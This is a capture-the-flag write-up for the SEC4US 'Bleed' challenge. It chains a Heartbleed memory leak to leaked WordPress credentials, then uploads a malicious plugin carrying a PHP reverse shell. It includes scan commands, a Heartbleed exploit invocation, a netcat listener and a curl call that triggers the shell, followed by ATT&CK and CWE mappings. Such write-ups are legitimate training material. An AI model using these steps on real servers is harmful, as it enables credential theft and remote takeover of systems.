# MAQ163: Bleed

Writeup for the **Bleed** challenge on [SEC4US](https://sec4us.com.br/).

> **Category:** Hacking: Hard
> **Difficulty:** Hard
> **Points:** 163

---

## Overview

This challenge exploits the Heartbleed vulnerability (CVE-2014-0160) in OpenSSL to leak sensitive data from server memory, including credentials. Those credentials grant access to a WordPress instance where a malicious plugin upload provides remote code execution and access to the flag.

## Reconnaissance

```bash
nmap -sC -sV -p- [TARGET_IP]
```

The scan shows HTTPS on port 443 and HTTP on port 80 hosting a WordPress site. The TLS service uses an OpenSSL version vulnerable to Heartbleed.

```bash
nmap --script ssl-heartbleed -p 443 [TARGET_IP]
```

The script confirms the target is vulnerable to CVE-2014-0160.

## Exploitation

### Phase 1: Heartbleed Memory Leak

1. Run the Heartbleed exploit repeatedly to capture memory fragments from the server process.

```bash
python2 heartbleed.py [TARGET_IP] -p 443 | tee leak_output.txt
```

2. Analyze the leaked memory for credentials, session tokens, or authentication cookies.
3. Extract valid credentials: `[FOUND_CREDS]`.

### Phase 2: WordPress Compromise

1. Log in to the WordPress admin panel at `https://[TARGET_IP]/wp-admin/` using the leaked credentials.
2. Navigate to Plugins > Add New > Upload Plugin.
3. Upload a crafted malicious plugin (PHP reverse shell packaged as a WordPress plugin ZIP).
4. Activate the plugin and trigger the reverse shell callback.

```bash
nc -lvnp 4444
curl -k https://[TARGET_IP]/wp-content/plugins/[PLUGIN_PATH]/shell.php
```

5. Retrieve the flag from the filesystem.

## Security Framework Mapping

### MITRE ATT&CK

| Technique | ID |
|-----------|----|
| Exploit Public-Facing Application | T1190 |
| Unsecured Credentials: Credentials in Files | T1552.001 |
| Valid Accounts | T1078 |
| Server Software Component: Web Shell | T1505.003 |

### CWE

- **CWE-126:** Buffer Over-read (Heartbleed)
- **CWE-522:** Insufficiently Protected Credentials
- **CWE-434:** Unrestricted Upload of File with Dangerous Type

### D3FEND

- **D3-NTF:** Network Traffic Filtering
- **D3-HD:** Homoglyph Detection

---

The heart was bleeding secrets all along; sometimes the most dangerous wounds are the ones the server does not know it has.

(❍ᴥ❍ʋ)

- Instagram: https://www.instagram.com/uniaogeek
- LinkedIn: http://linkedin.com/in/mrhenrike
- X: https://x.com/mrhenrike
